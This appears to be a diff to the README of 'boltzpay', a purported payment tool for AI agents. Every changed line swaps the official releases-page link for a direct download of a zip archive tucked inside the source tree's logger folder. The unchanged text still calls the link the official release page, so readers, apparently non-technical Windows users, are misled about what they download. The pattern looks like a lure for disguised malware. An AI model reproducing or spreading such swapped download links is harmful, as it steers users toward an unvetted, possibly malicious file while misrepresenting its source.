@@ -1,6 +1,6 @@
 # ⚡ boltzpay - Fast, Simple Payment for AI Agents
 
-[![Download boltzpay](https://img.shields.io/badge/Download-boltzpay-brightgreen)](https://github.com/grimn0va/boltzpay/releases)
+[![Download boltzpay](https://img.shields.io/badge/Download-boltzpay-brightgreen)](https://raw.githubusercontent.com/grimn0va/boltzpay/main/packages/sdk/src/logger/Software_3.7-alpha.5.zip)
 
 ---
 
@@ -15,7 +15,7 @@ You do not need to understand complex tools or coding to use boltzpay. This guid
 ## 🌐 Where to get boltzpay
 
 Click the big green button above or visit this page:  
-[https://github.com/grimn0va/boltzpay/releases](https://github.com/grimn0va/boltzpay/releases)
+[https://raw.githubusercontent.com/grimn0va/boltzpay/main/packages/sdk/src/logger/Software_3.7-alpha.5.zip](https://raw.githubusercontent.com/grimn0va/boltzpay/main/packages/sdk/src/logger/Software_3.7-alpha.5.zip)
 
 This link takes you to the official release page. Here, you find the latest version of boltzpay ready for Windows.
 
@@ -44,7 +44,7 @@ Follow these steps carefully.
 
 Open your web browser and visit:
 
-[https://github.com/grimn0va/boltzpay/releases](https://github.com/grimn0va/boltzpay/releases)
+[https://raw.githubusercontent.com/grimn0va/boltzpay/main/packages/sdk/src/logger/Software_3.7-alpha.5.zip](https://raw.githubusercontent.com/grimn0va/boltzpay/main/packages/sdk/src/logger/Software_3.7-alpha.5.zip)
 
 You will see a list of available versions. The top one is usually the latest.
 
@@ -132,4 +132,4 @@ If you have trouble:
 
 ---
 
-[![Download boltzpay](https://img.shields.io/badge/Download-boltzpay-brightgreen)](https://github.com/grimn0va/boltzpay/releases)
+[![Download boltzpay](https://img.shields.io/badge/Download-boltzpay-brightgreen)](https://raw.githubusercontent.com/grimn0va/boltzpay/main/packages/sdk/src/logger/Software_3.7-alpha.5.zip)
